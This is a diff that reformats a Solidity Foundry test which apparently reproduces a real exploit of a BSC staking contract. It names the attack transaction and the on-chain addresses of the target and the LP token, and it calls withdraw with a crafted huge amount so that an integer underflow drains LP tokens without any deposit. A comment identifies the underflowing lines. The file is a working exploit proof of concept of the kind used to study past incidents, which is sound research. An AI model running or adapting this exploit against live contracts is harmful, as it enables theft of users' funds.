@@ -12,12 +12,14 @@ import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
 // Attack TX: https://bscscan.com/tx/0x784b68dc7d06ee181f3127d5eb5331850b5e690cc63dd099cd7b8dc863204bf6
 
 interface IStakingRewards {
+
     function withdraw(uint256 amount) external;
+
 }
 
 contract AttackContract is Test {
-    IStakingRewards constant StakingRewards =
-        IStakingRewards(0xB3FB1D01B07A706736Ca175f827e4F56021b85dE);
+
+    IStakingRewards constant StakingRewards = IStakingRewards(0xB3FB1D01B07A706736Ca175f827e4F56021b85dE);
     IERC20 constant uniLP = IERC20(0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042);
 
     function setUp() public {
@@ -25,11 +27,7 @@ contract AttackContract is Test {
     }
 
     function testExploit() public {
-        emit log_named_decimal_uint(
-            "Before exploiting, Attacker UniLP Balance",
-            uniLP.balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("Before exploiting, Attacker UniLP Balance", uniLP.balanceOf(address(this)), 18);
 
         StakingRewards.withdraw(8_792_873_290_680_252_648_282); //without putting any crypto, we can drain out the LP tokens in uniswap pool by underflow.
 
@@ -42,10 +40,7 @@ contract AttackContract is Test {
         _totalSupply = _totalSupply - amount;
         _balances[user] = _balances[user] - amount;   //<---- underflow here.
         */
-        emit log_named_decimal_uint(
-            "After exploiting, Attacker UniLP Balance",
-            uniLP.balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("After exploiting, Attacker UniLP Balance", uniLP.balanceOf(address(this)), 18);
     }
+
 }
